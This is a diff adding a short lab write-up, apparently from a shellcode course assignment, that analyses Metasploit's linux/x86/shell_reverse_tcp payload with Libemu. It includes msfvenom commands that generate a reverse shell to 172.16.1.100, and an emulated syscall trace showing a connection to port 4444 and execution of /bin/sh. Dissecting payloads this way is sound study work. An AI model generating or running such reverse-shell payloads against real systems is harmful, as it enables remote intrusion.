@@ -1,0 +1,65 @@
+Step 1:
+
+Using Libemu we will analysis  linux/x86/shell_reverse_tcp of Msfpayload for linux/x86.
+
+root@kali:~# msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.16.1.100 | /usr/bin/sctest -vvv -S -s 10000
+//** IMPORTANT PART **//
+int socket (
+     int domain = 2;
+     int type = 1;
+     int protocol = 0;
+) =  14;
+int dup2 (
+     int oldfd = 14;
+     int newfd = 2;
+) =  2;
+int dup2 (
+     int oldfd = 14;
+     int newfd = 1;
+) =  1;
+int dup2 (
+     int oldfd = 14;
+     int newfd = 0;
+) =  0;
+int connect (
+     int sockfd = 14;
+     struct sockaddr_in * serv_addr = 0x00416fbe => 
+         struct   = {
+             short sin_family = 2;
+             unsigned short sin_port = 23569 (port=4444);
+             struct in_addr sin_addr = {
+                 unsigned long s_addr = 1677791404 (host=172.16.1.100);
+             };
+             char sin_zero = "       ";
+         };
+     int addrlen = 102;
+) =  0;
+int execve (
+     const char * dateiname = 0x00416fa6 => 
+           = "/bin//sh";
+     const char * argv[] = [
+           = 0x00416f9e => 
+               = 0x00416fa6 => 
+                   = "/bin//sh";
+           = 0x00000000 => 
+             none;
+     ];
+     const char * envp[] = 0x00000000 => 
+         none;
+) =  0;
+
+Step 2#
+root@kali:/home/SLAE/Assignment5# msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.16.1.100 > shell_reverse_tcp.bin
+No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+No Arch selected, selecting Arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 68 bytes
+
+root@kali:/home/SLAE/Assignment5# file shell_reverse_tcp.bin 
+shell_reverse_tcp.bin: data
+root@kali:/home/SLAE/Assignment5# sctest -vvv -S -s 10000 -G shell_reverse_tcp.dot < shell_reverse_tcp.bin 
+
+Step 3# prepare the PNG file
+root@kali:/home/SLAE/Assignment5# file shell_reverse_tcp.dot 
+shell_reverse_tcp.dot: ASCII text, with very long lines
+root@kali:/home/SLAE/Assignment5# dot shell_reverse_tcp.dot -T png -o shell_reverse_tcp.png
